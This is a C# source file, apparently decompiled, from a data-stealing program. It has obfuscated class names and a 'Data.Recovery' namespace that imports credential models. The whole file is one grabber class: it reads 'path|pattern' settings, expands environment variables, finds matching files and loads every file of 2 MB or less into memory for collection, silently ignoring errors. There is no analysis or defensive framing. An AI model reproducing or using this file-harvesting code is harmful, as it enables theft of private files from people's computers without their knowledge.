using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class gg3 : GH9kf<DesktopFile>
	{
		public IEnumerable<string> GrabberSettings
		{
			get;
			set;
		}

		public gg3()
		{
			GrabberSettings = new List<string>();
		}

		public List<DesktopFile> EnumerateData()
		{
			List<DesktopFile> list = new List<DesktopFile>();
			if (GrabberSettings == null)
			{
				return list;
			}
			foreach (string grabberSetting in GrabberSettings)
			{
				if (!string.IsNullOrEmpty(grabberSetting))
				{
					string[] array = grabberSetting.Split('|');
					if (array.Length == 2)
					{
						string[] files = Directory.GetFiles(Environment.ExpandEnvironmentVariables(array[0]), array[1], SearchOption.TopDirectoryOnly);
						foreach (string fileName in files)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(fileName);
								if (fileInfo.Length <= 2097152)
								{
									list.Add(new DesktopFile
									{
										FileData = File.ReadAllBytes(fileInfo.FullName),
										Filename = fileInfo.Name
									});
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			return list;
		}
	}
}
